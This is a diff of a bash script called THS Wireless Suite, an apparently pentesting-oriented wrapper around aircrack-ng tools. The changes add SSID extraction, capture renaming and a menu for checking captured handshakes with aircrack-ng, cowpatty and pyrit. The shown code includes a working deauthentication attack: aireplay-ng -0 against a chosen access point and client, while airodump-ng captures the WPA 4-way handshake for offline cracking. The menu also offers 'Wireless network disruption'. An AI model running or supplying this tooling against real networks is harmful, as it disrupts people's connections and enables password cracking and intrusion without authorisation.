@@ -2,7 +2,7 @@
 #THS Wireless Suite
 #thsuite.sh v0.1
 #By TAPE
-#Last edit 12-08-2013 22:00
+#Last edit 12-08-2013 23:40
 #Written, and intended for use on CR4CK3RB0X -- THS-OS v3
 #Tested with success on Kali Linux
 #Source: http://thsuite.googlecode.com/svn/thsuite.sh
@@ -166,8 +166,8 @@ f_header
 echo $BLU">$STD Wireless Interface manipulation"
 echo $STD""
 echo $STD"Available interface(s) $GRN"
-f_iface_stat
 f_exist
+f_iface_stat
 echo $BLU"
 OPTIONS $STD
 1  Create monitor interface
@@ -462,8 +462,8 @@ clear
 f_header
 echo $BLU">$STD Wireless scanning"
 echo $STD""
-f_exist
 echo $STD"Available interface(s)"
+f_exist
 f_iface_stat
 f_mon_check
 echo $STD""
@@ -523,14 +523,9 @@ clear
 f_header
 f_clean
 echo $BLU">$STD THSuite scans / captures"
-if [ ! -e /root/THS_TMP/ ] ; then
-echo -e $RED"\n >> No previous THSuite scans detected <<"
-sleep 1.5
-f_menu
-fi
 FILES=$(ls -A /root/THS_TMP/)
 if [ "$FILES" == "" ] ; then 
-echo -e $RED"\n >> No previous THSuite scans/captures found <<"
+echo -e $RED"\n >> No previous THSuite scans/captures found <<$STD"
 sleep 1.5
 f_menu
 fi
@@ -1118,6 +1113,7 @@ read DIFACE
 TARGET_AP=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print $1}')
 TARGET_CHAN=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 4 | sed -e 's/^ *//' -e 's/ *$//')
 TARGET_CL=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print $2}')
+TARGET_SSID=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 14 | sed 's/[ ]//')
 #
 if [ "$DIFACE" != "$IFACE" ] ; then
 iwconfig $DIFACE channel $TARGET_CHAN
@@ -1137,25 +1133,93 @@ else
 TARGET_AP=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print $1}')
 TARGET_CHAN=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 4 | sed -e 's/^ *//' -e 's/ *$//')
 TARGET_CL=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print $2}')
+TARGET_SSID=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 14 | sed 's/[ ]//')
 #
 echo $GRN">$STD Attempting to force & capture handshake"
 NAME=$(echo $TARGET_AP | sed 's/:/-/g')
-FILENAME="HANDSHAKE-$NAME"
+FILENAME="TEMP-$NAME"
 sleep 3 && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $IFACE -0 5 -a $TARGET_AP -c $TARGET_CL \
 & timeout 15 xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $TARGET_CHAN --bssid $TARGET_AP --output-format cap -w $SAVEDIR$FILENAME
 #
 echo $GRN">$STD Deauth attempt on target AP complete"
 sleep 1
+#Rename capture file 
+HS_NAME=$(echo $TARGET_SSID)
+mv $SAVEDIR"$FILENAME"* $SAVEDIR"$HS_NAME".cap
+HANDSHAKE=$SAVEDIR"$HS_NAME".cap
+# tmp files deletion check
+	if [ -e /root/THS_TMP/wpa_temp-01.cap ] ; then rm /root/THS_TMP/wpa_temp* ; fi
+	if [ -e /root/THS_TMP/scan_assist.tmp ] ; then rm /root/THS_TMP/scan_assist.tmp ; fi
 fi
-#Rename and move capture file 
-HS_FILE=$(echo $TARGET_AP | sed 's/:/-/g')
-mv $SAVEDIR"$FILENAME"* $SAVEDIR"$HS_FILE".cap
 #
-echo $GRN">$STD Checking capture $SAVEDIR"$HS_FILE".cap with pyrit"
-pyrit -r $SAVEDIR"$HS_FILE".cap analyze
+echo -n $GRN">$STD Check $HANDSHAKE for handshakes? y/N $GRN"
+read CHECK
+if [[ "$CHECK" == "y" || "$CHECK" == "Y" ]] ; then f_handshake_check
+else
+f_exit
+fi
+}
 #
-if [ -e /root/THS_TMP/wpa_temp-01.cap ] ; then rm /root/THS_TMP/wpa_temp* ; fi
-if [ -e /root/THS_TMP/scan_assist.tmp ] ; then rm /root/THS_TMP/scan_assist.tmp ; fi
+##
+### HANDSHAKE VERIFICATION
+##########################
+f_handshake_check() {
+clear
+f_header
+echo $BLU">$STD Check capture file for useable handshake"
+echo $BLU"
+OPTIONS$STD
+1  Check with aircrack 
+2  Check with cowpatty
+3  Check with pyrit
+4  Check with all: aircrack / cowpatty / pyrit
+Q  Back to main menu
+"$STD
+echo -n $STD"Enter choice from above menu: $GRN"
+read CHECK_MENU
+	if [ "$CHECK_MENU" == "q" ] || [ "$CHECK_MENU" == "Q" ] ; then 
+	echo $STD""
+	f_menu
+	elif [ "$CHECK_MENU" == "" ] ; then f_menu
+	elif [[ "$CHECK_MENU" != [1-4] ]]; then
+	echo $RED">$STD Input error $RED[$STD$CHECK_MENU$RED]$STD must be an entry from the above menu$STD"
+	sleep 1
+	f_handshake_check
+	fi
+#
+# Option 1 
+# --------
+if [ "$CHECK_MENU" == "1" ] ; then
+echo $STD
+echo $GRN">$STD Checking $GRN$HANDSHAKE$STD with aircrack
+"$STD
+aircrack-ng $HANDSHAKE
+elif [ "$CHECK_MENU" == "2" ] ; then
+echo $STD
+echo $GRN">$STD Checking $GRN$HANDSHAKE$STD with cowpatty
+"$STD
+cowpatty -c -r $HANDSHAKE -s $TARGET_SSID
+elif [ "$CHECK_MENU" == "3" ] ; then
+echo $STD
+echo $GRN">$STD Checking $GRN$HANDSHAKE$STD with pyrit
+"$STD
+pyrit -r $HANDSHAKE analyze
+elif [ "$CHECK_MENU" == "4" ] ; then
+echo $STD
+echo $GRN">$STD Checking $GRN$HANDSHAKE$STD with aircrack
+"$STD
+aircrack-ng $HANDSHAKE
+sleep 1.5
+echo $STD
+echo $GRN">$STD Checking $GRN$HANDSHAKE$STD with cowpatty
+"$STD
+cowpatty -c -r $HANDSHAKE -s $TARGET_SSID
+sleep 1.5
+echo $STD
+echo $GRN">$STD Checking $GRN$HANDSHAKE$STD with pyrit
+"$STD
+pyrit -r $HANDSHAKE analyze
+fi
 f_exit
 }
 #
@@ -1265,7 +1329,7 @@ cat << !
 2  MAC address manipulation
 3  Wireless Scanning
 4  View previous scans/captures
-5  Capture and strip 4-way handshakes
+5  Manual & assisted handshake acquisition
 6  Wireless network disruption 
 
 h  help info
@@ -1289,7 +1353,7 @@ u) f_update ;;
 q) f_exit ;; 
 Q) f_exit ;;
 v) f_vers ;;
-*) echo $RED"\"$menu\" is not a valid menu item"$STD; sleep 0.5 ;;
+*) echo $RED">$STD Input error $RED[$STD$menu$RED]$STD not a valid menu item"$STD; sleep 0.5 ;;
 esac
 done
 }
@@ -1315,4 +1379,5 @@ f_menu
 # - Optimise code with functions to reduce size / improve performane
 # - Include option to alter save directory
 # - Write general help file / help file for each menu item
+
 
